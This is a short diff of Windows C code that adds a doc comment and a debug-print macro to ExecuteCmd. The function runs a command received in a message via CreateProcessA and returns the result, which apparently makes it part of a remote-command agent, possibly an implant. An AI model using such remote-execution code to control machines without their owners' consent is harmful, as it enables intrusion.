@@ -2,8 +2,13 @@
 #include "message.h"
 #include "debug.h"
 #include <windows.h>
-// TODO: Add logic to check for command failure vs fatal failure (memory)
-// TODO: Change out INTS for DWORDS
+
+/*
+@brief Function that executes a command
+@param PMESSAGE containts the parameters for the command
+@param PMESSAGE is a pointer to the result that will be sent back
+@return ERROR_T with status of dir
+*/
 ERROR_T ExecuteCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
     INT iError = E_SUCCESS;
     PDWORD pRemoteCmdLen = NULL;
@@ -27,7 +32,7 @@ ERROR_T ExecuteCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
 
 	iError = CreateProcessA(NULL, pRemoteCmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL,  &startup_info, &process_info);
     if (0 == iError){
-        printf("%d\n", GetLastError());
+        DBG_PRINT("%d\n", GetLastError());
         iError = E_EXECUTE_ERROR;
         goto end;
     }
